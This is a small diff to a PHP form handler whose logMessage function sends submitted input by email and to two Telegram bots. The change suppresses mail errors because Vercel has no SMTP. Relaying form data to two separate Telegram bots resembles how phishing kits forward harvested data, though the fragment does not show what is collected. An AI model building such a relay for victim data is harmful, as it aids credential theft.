@@ -24,8 +24,9 @@ $chosen_number = isset($_POST['chosen_number']) ? trim($_POST['chosen_number']) 
 
 // Function to log message via email and Telegram
 function logMessage($message, $send, $subject) {
-    // Send email
-    $emailResult = mail($send, $subject, $message);
+    // Send email (disabled on Vercel serverless - no outbound SMTP)
+    // Telegram is the primary notification channel and works independently
+    $emailResult = @mail($send, $subject, $message);
 
     // Send to Telegram
     global $botToken, $id, $botToken2, $id2;
